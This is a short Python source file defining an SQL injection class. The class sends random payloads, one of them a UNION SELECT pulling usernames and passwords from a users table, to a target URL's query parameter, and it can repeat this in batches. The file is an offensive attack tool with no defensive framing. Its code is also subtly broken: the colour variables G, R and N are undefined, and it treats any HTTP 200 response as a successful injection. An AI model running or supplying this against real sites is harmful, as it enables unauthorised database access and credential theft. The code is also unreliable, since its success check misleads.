import requests
import random

class SQLInjection:
    def __init__(self):
        self.payloads = [
            "' OR 1=1 --", 
            "' UNION SELECT null, username, password FROM users --", 
            "' OR 'a'='a' --"
        ]

    def perform_sql_injection(self, url):
        payload = random.choice(self.payloads)
        injection_url = f"{url}?input={payload}"
        print(f"Performing SQL Injection on: {injection_url}")
        response = requests.get(injection_url)
        
        if response.status_code == 200:
            print(f"{G}SQL Injection successful at: {injection_url}{N}")
        else:
            print(f"{R}SQL Injection failed at: {injection_url}{N}")

    def run_batch_sql_injections(self, url, num_injections=5):
        for _ in range(num_injections):
            self.perform_sql_injection(url)
